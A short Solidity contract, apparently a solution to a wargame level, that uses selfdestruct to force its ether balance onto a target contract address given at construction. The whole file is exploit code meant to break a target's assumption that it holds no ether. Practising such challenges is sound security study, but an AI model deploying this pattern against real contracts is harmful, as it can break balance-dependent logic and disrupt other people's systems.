// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
  address force;

  constructor(address _force) payable {
    force = _force;
  }

  function attack() public  payable {
    
     address payable f = payable(force);

     selfdestruct(f);
  }

  receive() external payable { }
  fallback() external payable { }
}